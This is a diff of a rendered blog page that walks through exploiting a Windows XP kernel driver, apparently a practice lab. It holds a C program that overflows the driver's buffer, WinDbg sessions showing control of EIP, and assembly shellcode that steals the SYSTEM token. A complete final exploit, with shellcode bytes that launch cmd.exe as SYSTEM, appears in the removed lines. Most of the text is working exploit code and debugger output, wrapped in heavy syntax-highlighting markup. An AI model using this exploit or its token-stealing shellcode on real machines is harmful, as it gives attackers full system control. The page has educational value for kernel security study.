-
-    <span class="n">DeviceIoControl</span><span class="p">(</span><span class="n">hDevice</span><span class="p">,</span> <span class="n">IOCTL_HI</span><span class="p">,</span> <span class="n">magik</span><span class="p">,</span> <span class="n">lenMagik</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">byte</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
-    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hDevice</span><span class="p">);</span>
-
-    <span class="k">return</span> <span class="n">EXIT_SUCCESS</span><span class="p">;</span>
-<span class="p">}</span>
-</code></pre></div></div>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\WinDDK\7600.16385.1&gt;cd C:\driver\level0
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;winioctl.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="cp">#define IOCTL_HI CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define DEVICE_NAME &#34;\\\\.\\1&#34;
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">DWORD</span> <span class="n">byte</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">lenMagik</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">addr</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">HANDLE</span> <span class="n">hDevice</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">UCHAR</span> <span class="n">magik</span><span class="p">[</span><span class="mi">1024</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">memset</span><span class="p">(</span><span class="n">magik</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mi">276</span><span class="p">);</span> <span class="c1">// Padding
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">lenMagik</span> <span class="o">+=</span> <span class="mi">276</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">memcpy</span><span class="p">(</span><span class="n">magik</span><span class="o">+</span><span class="mi">276</span><span class="p">,</span> <span class="s">&#34;</span><span class="se">\x42\x42\x42\x42\x00</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">5</span><span class="p">);</span> <span class="c1">// Shellcode address?
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">lenMagik</span> <span class="o">+=</span> <span class="mi">5</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">hDevice</span> <span class="o">=</span> <span class="n">CreateFile</span><span class="p">(</span><span class="n">DEVICE_NAME</span><span class="p">,</span> <span class="n">GENERIC_WRITE</span> <span class="o">|</span> <span class="n">GENERIC_READ</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">OPEN_EXISTING</span><span class="p">,</span> <span class="n">FILE_ATTRIBUTE_NORMAL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">hDevice</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[-] Error with Createfile : %.8x.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">EXIT_FAILURE</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">DeviceIoControl</span><span class="p">(</span><span class="n">hDevice</span><span class="p">,</span> <span class="n">IOCTL_HI</span><span class="p">,</span> <span class="n">magik</span><span class="p">,</span> <span class="n">lenMagik</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">byte</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hDevice</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">EXIT_SUCCESS</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><pre tabindex="0"><code>C:\WinDDK\7600.16385.1&gt;cd C:\driver\level0
 
 C:\driver\level0&gt;build
 BUILD: Compile and Link for x86
@@ -229,10 +210,10 @@ BUILD: Loading c:\winddk\7600.16385.1\build.dat...
 BUILD: Computing Include file dependencies:
 BUILD: Start time: Thu Feb 27 09:13:48 2014
 BUILD: Examining c:\driver\level0 directory for files to compile.
-    c:\driver\level0 Invalidating OACR warning log for 'root:x86chk'
+    c:\driver\level0 Invalidating OACR warning log for &#39;root:x86chk&#39;
 BUILD: Saving c:\winddk\7600.16385.1\build.dat...
 BUILD: Compiling and Linking c:\driver\level0 directory
-Configuring OACR for 'root:x86chk' - &lt;OACR on&gt;
+Configuring OACR for &#39;root:x86chk&#39; - &lt;OACR on&gt;
 _NT_TARGET_VERSION SET TO WINXP
 Compiling - exploit.c
 Linking Executable - objchk_wxp_x86\i386\exploit.exe
@@ -241,9 +222,7 @@ BUILD: Done
 
     3 files compiled - 1 Warning - 30 LPS
     1 executable built
-</code></pre></div></div>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kd&gt; g
+</code></pre><pre tabindex="0"><code>kd&gt; g
 [ Loading.. ]
 [ Creating the device...]
 [ Linking...]
@@ -279,12 +258,9 @@ baf7d62e 5d              pop     ebp
 baf7d62f c20800          ret     8
 
 kd&gt; bp baf7d62f
-</code></pre></div></div>
-
-<p>All is ready ! We <code class="highlighter-rouge">!go</code> and WinDbg look like that:</p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kd&gt; g
-[ Let's copying this buffer...]Breakpoint 0 hit
+</code></pre><p>All is ready ! We <code>!go</code> and WinDbg look like that:</p>
+<pre tabindex="0"><code>kd&gt; g
+[ Let&#39;s copying this buffer...]Breakpoint 0 hit
 1+0x62f:
 baf7d62f c20800          ret     8
 
@@ -294,18 +270,13 @@ b9019c48  80574d5e 863b0770 8672a420 863b0700
 
 kd&gt; t
 42424242 ??              ???
-</code></pre></div></div>
-
-<p>We control EIP! Therefore, we will put a shellcode in userland to make an 
-escalade privilege of our process. After that, we will point EIP to our 
+</code></pre><p>We control EIP! Therefore, we will put a shellcode in userland to make an
+escalade privilege of our process. After that, we will point EIP to our
 shellcode and hop, our process have the SYSTEM rights!</p>
-
 <h2 id="shellcode">Shellcode</h2>
-
 <p>Now we need to code a shellcode to swap the SYSTEM token with our process token.
 To do that, we look for useful structures in Windows kernel:</p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kd&gt; r fs
+<pre tabindex="0"><code>kd&gt; r fs
 fs=00000030
 
 kd&gt; dg fs
@@ -319,7 +290,7 @@ nt!_KPCR
    +0x000 NtTib            : _NT_TIB
    +0x01c SelfPcr          : 0xffdff000 _KPCR
    +0x020 Prcb             : 0xffdff120 _KPRCB
-   +0x024 Irql             : 0x1c ''
+   +0x024 Irql             : 0x1c &#39;&#39;
    +0x028 IRR              : 4
    +0x02c IrrActive        : 0
    +0x030 IDR              : 0xffff20d8
@@ -331,16 +302,16 @@ nt!_KPCR
    +0x046 MinorVersion     : 1
    +0x048 SetMember        : 1
    +0x04c StallScaleFactor : 0x64
-   +0x050 DebugActive      : 0 ''
-   +0x051 Number           : 0 ''
-   +0x052 Spare0           : 0 ''
-   +0x053 SecondLevelCacheAssociativity : 0 ''
+   +0x050 DebugActive      : 0 &#39;&#39;
+   +0x051 Number           : 0 &#39;&#39;
+   +0x052 Spare0           : 0 &#39;&#39;
+   +0x053 SecondLevelCacheAssociativity : 0 &#39;&#39;
    +0x054 VdmAlert         : 0
    +0x058 KernelReserved   : [14] 0
    +0x090 SecondLevelCacheSize : 0
    +0x094 HalReserved      : [16] 0
    +0x0d4 InterruptMode    : 0
-   +0x0d8 Spare1           : 0 ''
+   +0x0d8 Spare1           : 0 &#39;&#39;
    +0x0dc KernelReserved2  : [17] 0
    +0x120 PrcbData         : _KPRCB
 
@@ -359,13 +330,13 @@ nt!_KTHREAD
    +0x020 Teb              : (null) 
    +0x024 TlsArray         : (null) 
    +0x028 KernelStack      : 0x80549c4c Void
-   +0x02c DebugActive      : 0 ''
-   +0x02d State            : 0x2 ''
-   +0x02e Alerted          : [2]  ""
-   +0x030 Iopl             : 0 ''
-   +0x031 NpxState         : 0xa ''
-   +0x032 Saturation       : 0 ''
-   +0x033 Priority         : 16 ''
+   +0x02c DebugActive      : 0 &#39;&#39;
+   +0x02d State            : 0x2 &#39;&#39;
+   +0x02e Alerted          : [2]  &#34;&#34;
+   +0x030 Iopl             : 0 &#39;&#39;
+   +0x031 NpxState         : 0xa &#39;&#39;
+   +0x032 Saturation       : 0 &#39;&#39;
+   +0x033 Priority         : 16 &#39;&#39;
    +0x034 ApcState         : _KAPC_STATE
 
 kd&gt; dt _KAPC_STATE poi(ffdff000+0x120+0x004)+0x034 
@@ -392,172 +363,156 @@ nt!_EPROCESS
    +0x0c0 ExceptionPort    : (null) 
    +0x0c4 ObjectTable      : (null) 
    +0x0c8 Token            : _EX_FAST_REF
-</code></pre></div></div>
-
-<p>We could use <code class="highlighter-rouge">UniqueProcessId (+0x084)</code>, our <code class="highlighter-rouge">Token (+0x0c8)</code> and also the 
-linked list <code class="highlighter-rouge">ActiveProcessLinks (+0x088)</code> to get the list of all process.
-In XP, the identifier of SYSTEM process is <em>4</em> and we can get our PID with 
-<code class="highlighter-rouge">GetCurrentProcessId()</code>. With these information, we can code our shellcode. 
+</code></pre><p>We could use <code>UniqueProcessId (+0x084)</code>, our <code>Token (+0x0c8)</code> and also the
+linked list <code>ActiveProcessLinks (+0x088)</code> to get the list of all process.
+In XP, the identifier of SYSTEM process is <em>4</em> and we can get our PID with
+<code>GetCurrentProcessId()</code>. With these information, we can code our shellcode.
 I have coded mine with the FASM syntax:</p>
-
-<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">format</span> <span class="nv">PE</span> <span class="nv">GUI</span> <span class="mf">4.0</span>
-
-<span class="nl">start:</span>
-
-<span class="c1">;--------------------------------</span>
-<span class="c1">; 			Stack</span>
-<span class="c1">;--------------------------------</span>
-<span class="c1">; ESP-8: EPROCESS+0x088 system</span>
-<span class="c1">;--------------------------------</span>
-<span class="c1">; ESP-4: EPROCESS+0x088 exploit</span>
-<span class="c1">;--------------------------------</span>
-<span class="nf">push</span> <span class="mh">0xFFFFFFFF</span>
-<span class="nf">push</span> <span class="mh">0xFFFFFFFF</span>
-
-<span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">fs</span><span class="p">:</span><span class="mh">0x124</span><span class="p">]</span>     <span class="c1">; +0x120 PrcbData : _KPRCB | +0x004 CurrentThread : _KTHREAD			</span>
-<span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">edx</span> <span class="o">+</span> <span class="mh">0x44</span><span class="p">]</span>   <span class="c1">; +0x034 ApcState : _KAPC_STATE | +0x010 Process : _KPROCESS</span>
-<span class="nf">add</span> <span class="nb">edx</span><span class="p">,</span> <span class="mh">0x88</span>           <span class="c1">; +0x088 ActiveProcessLinks : _LIST_ENTRY</span>
-<span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">edx</span>            <span class="c1">; Our linked list \o/ We save the first structure</span>
-
-<span class="nl">searchProcess:</span>
-<span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">edx</span> <span class="o">-</span> <span class="mh">0x4</span><span class="p">]</span>    <span class="c1">; +0x084 UniqueProcessId</span>
-<span class="nf">cmp</span> <span class="nb">eax</span><span class="p">,</span> <span class="mh">0x4</span>            <span class="c1">; SYSTEM PID</span>
-<span class="nf">je</span> <span class="nv">sysProcFound</span>
-<span class="nf">cmp</span> <span class="nb">eax</span><span class="p">,</span> <span class="mh">0x41414141</span>     <span class="c1">; Our exploit PID</span>
-<span class="nf">je</span> <span class="nv">exploitProcFound</span>
-
-<span class="nl">nextProcess:</span>
-<span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">edx</span><span class="p">]</span>          <span class="c1">; Next process (Flink)</span>
-<span class="nf">cmp</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">ebx</span>            <span class="c1">; We are back at the starting point</span>
-<span class="nf">je</span> <span class="nv">retApp</span>				
-<span class="nf">jmp</span> <span class="nv">searchProcess</span>       <span class="c1">; We loop!</span>
-
-<span class="nl">sysProcFound:</span>
-<span class="nf">mov</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mi">4</span><span class="p">],</span> <span class="nb">edx</span>
-<span class="nf">jmp</span> <span class="nb">al</span><span class="nv">lPIDFound</span>
-
-<span class="nl">exploitProcFound:</span>
-<span class="nf">mov</span> <span class="p">[</span><span class="nb">esp</span><span class="p">],</span> <span class="nb">edx</span>
-
-<span class="nl">allPIDFound:</span>
-<span class="nf">cmp</span> <span class="p">[</span><span class="nb">esp</span><span class="p">],</span> <span class="kt">dword</span> <span class="mh">0xFFFFFFFF</span>
-<span class="nf">je</span> <span class="nv">nextProcess</span>
-<span class="nf">cmp</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mi">4</span><span class="p">],</span> <span class="kt">dword</span> <span class="mh">0xFFFFFFFF</span>
-<span class="nf">je</span> <span class="nv">nextProcess</span>
-
-<span class="c1">; We copy the SYSTEM token</span>
-<span class="nf">pop</span> <span class="nb">edi</span>                 <span class="c1">; Exploit</span>
-<span class="nf">pop</span> <span class="nb">esi</span>	                <span class="c1">; System</span>
-<span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">esi</span> <span class="o">+</span> <span class="mh">0x40</span><span class="p">]</span>   <span class="c1">; 0xC8 - 0x88 = 0x40 | +0x0c8 Token : _EX_FAST_REF</span>
-<span class="nf">mov</span> <span class="p">[</span><span class="nb">edi</span> <span class="o">+</span> <span class="mh">0x40</span><span class="p">],</span> <span class="nb">eax</span>
-
-<span class="nl">retApp:</span>
-<span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>
-<span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mh">0x3B</span>            <span class="c1">; FS address in userland</span>
-<span class="nf">mov</span> <span class="nb">fs</span><span class="p">,</span> <span class="nb">ax</span>
-<span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="mh">0x42424242</span>     <span class="c1">; Stack address</span>
-<span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="mh">0x43434343</span>     <span class="c1">; Address of our function in our process</span>
-<span class="nf">sysexit</span>
-</code></pre></div></div>
-
-<h2 id="final-exploit">Final exploit</h2>
-
-<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;windows.h&gt;
-#include &lt;winioctl.h&gt;
-#include &lt;stdio.h&gt;
-#include &lt;stdlib.h&gt;
-</span>
-<span class="cp">#define IOCTL_HI CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define DEVICE_NAME "\\\\.\\1"
-</span>
-<span class="n">BYTE</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span>  <span class="s">"</span><span class="se">\x6A\xFF\x6A\xFF\x64\x8B\x15\x24\x01\x00\x00\x8B\x52\x44\x81\xC2\x88\x00\x00\x00\x89\xD3\x8B</span><span class="s">"</span>
-                    <span class="s">"</span><span class="se">\x42\xFC\x83\xF8\x04\x74\x0F\x3D\x41\x41\x41\x41\x74\x0E\x8B\x12\x39\xDA\x74\x26\xEB\xE9\x89</span><span class="s">"</span>
-                    <span class="s">"</span><span class="se">\x54\x24\x04\xEB\x03\x89\x14\x24\x81\x3C\x24\xFF\xFF\xFF\xFF\x74\xE6\x81\x7C\x24\x04\xFF\xFF</span><span class="s">"</span>
-                    <span class="s">"</span><span class="se">\xFF\xFF\x74\xDC\x5F\x5E\x8B\x46\x40\x89\x47\x40\x31\xC0\xB0\x3B\x8E\xE0\xB9\x42\x42\x42\x42</span><span class="s">"</span>
-                    <span class="s">"</span><span class="se">\xBA\x43\x43\x43\x43\x0F\x35</span><span class="s">"</span><span class="p">;</span>
-<span class="n">STARTUPINFO</span> <span class="n">si</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
-<span class="n">PROCESS_INFORMATION</span> <span class="n">pi</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>  
-
-
-<span class="kt">void</span> <span class="nf">replacePattern</span><span class="p">(</span><span class="kt">char</span> <span class="n">buffer</span><span class="p">[],</span> <span class="kt">int</span> <span class="n">bufferSize</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">pattern</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">value</span><span class="p">)</span> <span class="p">{</span>
-    <span class="n">BOOL</span> <span class="n">found</span> <span class="o">=</span> <span class="n">FALSE</span><span class="p">;</span>
-    <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
-
-    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">bufferSize</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
-        <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">PDWORD</span><span class="p">)(</span><span class="n">buffer</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span> <span class="o">==</span> <span class="n">pattern</span><span class="p">)</span> <span class="p">{</span>
-            <span class="n">found</span> <span class="o">=</span> <span class="n">TRUE</span><span class="p">;</span>
-            <span class="o">*</span><span class="p">(</span><span class="n">PDWORD</span><span class="p">)(</span><span class="n">buffer</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span> <span class="o">=</span> <span class="n">value</span><span class="p">;</span>
-        <span class="p">}</span>
-    <span class="p">}</span>
-
-    <span class="k">return</span> <span class="n">found</span><span class="p">;</span>
-<span class="p">}</span>
-
-<span class="c1">// Code to execute with SYSTEM's right</span>
-<span class="c1">//</span>
-<span class="kt">void</span> <span class="nf">sysCode</span><span class="p">()</span> <span class="p">{</span>
-    <span class="n">si</span><span class="p">.</span><span class="n">cb</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">si</span><span class="p">);</span>
-
-    <span class="n">CreateProcess</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="s">"cmd.exe"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">TRUE</span><span class="p">,</span> <span class="n">CREATE_NEW_CONSOLE</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">si</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pi</span><span class="p">);</span>
-<span class="p">}</span>
-
-<span class="kt">int</span> <span class="nf">findStack</span><span class="p">()</span> <span class="p">{</span>
-    <span class="n">DWORD</span> <span class="n">stack</span><span class="p">;</span>
-
-    <span class="kr">__asm</span> <span class="n">mov</span> <span class="n">stack</span><span class="p">,</span> <span class="n">esp</span>
-
-    <span class="k">return</span> <span class="n">stack</span><span class="p">;</span>
-<span class="p">}</span>
-
-<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
-    <span class="n">DWORD</span> <span class="n">byte</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">lenMagik</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">addr</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-    <span class="n">HANDLE</span> <span class="n">hDevice</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
-    <span class="n">UCHAR</span> <span class="n">magik</span><span class="p">[</span><span class="mi">1024</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
-
-    <span class="n">addr</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span><span class="mh">0x01010101</span><span class="p">,</span> <span class="mh">0x10000</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>
-    <span class="k">if</span><span class="p">(</span><span class="n">addr</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
-        <span class="n">printf</span><span class="p">(</span><span class="s">"Error with VirtualProtect : %.8x"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
-        <span class="k">return</span> <span class="n">EXIT_FAILURE</span><span class="p">;</span>
-    <span class="p">}</span>
-
-    <span class="n">replacePattern</span><span class="p">(</span><span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="mh">0x41414141</span><span class="p">,</span> <span class="n">GetCurrentProcessId</span><span class="p">());</span>    <span class="c1">// Process PID</span>
-    <span class="n">replacePattern</span><span class="p">(</span><span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="mh">0x42424242</span><span class="p">,</span> <span class="n">findStack</span><span class="p">());</span>              <span class="c1">// Stack address</span>
-    <span class="n">replacePattern</span><span class="p">(</span><span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="mh">0x43434343</span><span class="p">,</span> <span class="n">sysCode</span><span class="p">);</span>                  <span class="c1">// Code to execute with SYSTEM's right</span>
-    <span class="n">memcpy</span><span class="p">(</span><span class="mh">0x01010101</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span>
-
-    <span class="n">memset</span><span class="p">(</span><span class="n">magik</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mi">276</span><span class="p">);</span>                       <span class="c1">// Padding</span>
-    <span class="n">lenMagik</span> <span class="o">+=</span> <span class="mi">276</span><span class="p">;</span>
-    <span class="n">memcpy</span><span class="p">(</span><span class="n">magik</span><span class="o">+</span><span class="mi">276</span><span class="p">,</span> <span class="s">"</span><span class="se">\x01\x01\x01\x01\x00</span><span class="s">"</span><span class="p">,</span> <span class="mi">5</span><span class="p">);</span>   <span class="c1">// Shellcode address</span>
-    <span class="n">lenMagik</span> <span class="o">+=</span> <span class="mi">5</span><span class="p">;</span>
-
-    <span class="n">hDevice</span> <span class="o">=</span> <span class="n">CreateFile</span><span class="p">(</span><span class="n">DEVICE_NAME</span><span class="p">,</span> <span class="n">GENERIC_WRITE</span> <span class="o">|</span> <span class="n">GENERIC_READ</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">OPEN_EXISTING</span><span class="p">,</span> <span class="n">FILE_ATTRIBUTE_NORMAL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
-    <span class="k">if</span><span class="p">(</span><span class="n">hDevice</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span> <span class="p">{</span>
-        <span class="n">printf</span><span class="p">(</span><span class="s">"[-] Error with Createfile : %.8x.</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
-        <span class="k">return</span> <span class="n">EXIT_FAILURE</span><span class="p">;</span>
-    <span class="p">}</span>
-
-    <span class="n">DeviceIoControl</span><span class="p">(</span><span class="n">hDevice</span><span class="p">,</span> <span class="n">IOCTL_HI</span><span class="p">,</span> <span class="n">magik</span><span class="p">,</span> <span class="n">lenMagik</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">byte</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
-    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hDevice</span><span class="p">);</span>
-
-    <span class="k">return</span> <span class="n">EXIT_SUCCESS</span><span class="p">;</span>
-<span class="p">}</span>
-</code></pre></div></div>
-
-        </div>
-      </div>
-    </div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="nf">format</span> <span class="nv">PE</span> <span class="nv">GUI</span> <span class="mf">4.0</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nl">start:</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">;--------------------------------</span>
+</span></span><span class="line"><span class="cl"><span class="c1">; 			Stack</span>
+</span></span><span class="line"><span class="cl"><span class="c1">;--------------------------------</span>
+</span></span><span class="line"><span class="cl"><span class="c1">; ESP-8: EPROCESS+0x088 system</span>
+</span></span><span class="line"><span class="cl"><span class="c1">;--------------------------------</span>
+</span></span><span class="line"><span class="cl"><span class="c1">; ESP-4: EPROCESS+0x088 exploit</span>
+</span></span><span class="line"><span class="cl"><span class="c1">;--------------------------------</span>
+</span></span><span class="line"><span class="cl"><span class="nf">push</span> <span class="mh">0xFFFFFFFF</span>
+</span></span><span class="line"><span class="cl"><span class="nf">push</span> <span class="mh">0xFFFFFFFF</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">fs</span><span class="p">:</span><span class="mh">0x124</span><span class="p">]</span>     <span class="c1">; +0x120 PrcbData : _KPRCB | +0x004 CurrentThread : _KTHREAD			</span>
+</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">edx</span> <span class="o">+</span> <span class="mh">0x44</span><span class="p">]</span>   <span class="c1">; +0x034 ApcState : _KAPC_STATE | +0x010 Process : _KPROCESS</span>
+</span></span><span class="line"><span class="cl"><span class="nf">add</span> <span class="nb">edx</span><span class="p">,</span> <span class="mh">0x88</span>           <span class="c1">; +0x088 ActiveProcessLinks : _LIST_ENTRY</span>
+</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">edx</span>            <span class="c1">; Our linked list \o/ We save the first structure</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nl">searchProcess:</span>
+</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">edx</span> <span class="o">-</span> <span class="mh">0x4</span><span class="p">]</span>    <span class="c1">; +0x084 UniqueProcessId</span>
+</span></span><span class="line"><span class="cl"><span class="nf">cmp</span> <span class="nb">eax</span><span class="p">,</span> <span class="mh">0x4</span>            <span class="c1">; SYSTEM PID</span>
+</span></span><span class="line"><span class="cl"><span class="nf">je</span> <span class="nv">sysProcFound</span>
+</span></span><span class="line"><span class="cl"><span class="nf">cmp</span> <span class="nb">eax</span><span class="p">,</span> <span class="mh">0x41414141</span>     <span class="c1">; Our exploit PID</span>
+</span></span><span class="line"><span class="cl"><span class="nf">je</span> <span class="nv">exploitProcFound</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nl">nextProcess:</span>
+</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">edx</span><span class="p">]</span>          <span class="c1">; Next process (Flink)</span>
+</span></span><span class="line"><span class="cl"><span class="nf">cmp</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">ebx</span>            <span class="c1">; We are back at the starting point</span>
+</span></span><span class="line"><span class="cl"><span class="nf">je</span> <span class="nv">retApp</span>				
